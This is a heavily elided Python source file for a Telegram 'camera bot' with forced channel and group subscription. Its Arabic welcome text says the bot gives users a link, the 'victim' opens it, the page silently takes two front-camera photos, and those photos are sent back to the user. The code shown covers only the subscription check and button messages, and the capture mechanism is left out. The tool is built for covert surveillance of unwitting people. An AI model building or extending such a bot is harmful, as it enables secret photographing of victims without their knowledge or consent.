#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# THE ARCHITECT - Terminal Output [2099]
# CAMERA BOT + FORCE SUB + WELCOME + DEV RIGHTS
# Developer: @wwwmonzer123456
...
async def check_subscription(bot: Bot, user_id: int) -> tuple:
    channel_ok = False
    group_ok = False
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if channel_ok and group_ok:
        await update.message.reply_text(
            ...
            f"🆔 <b>الآي دي:</b> <code>{user_id}</code>\n\n"
            f"📸 <b>وظيفة البوت:</b>\n"
            f"• ترسل رابط → يفتحه الضحية\n"
            f"• تلقائياً يتصور صورتين (كاميرا أمامية)\n"
            f"• الصور توصلك مباشرة هنا\n\n"
            f"⚡ <b>المطور:</b> {DEVELOPER_USERNAME}\n\n"
            f"اختر من الأزرار تحت:",
        ...
        await update.message.reply_text(
            ...
            f"ثم اضغط <b>تحقق من الاشتراك</b>",
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if query.data == "check_sub":
        ...
        if channel_ok and group_ok:
            ...
            await query.edit_message_text(
                f"❌ <b>لم تشترك بعد في:</b>\n{chr(10).join(missing)}\n\nاشترك ثم اضغط التحقق مرة أخرى.",
                reply_markup=get_force_sub_keyboard(),
                parse_mode="HTML"
            )
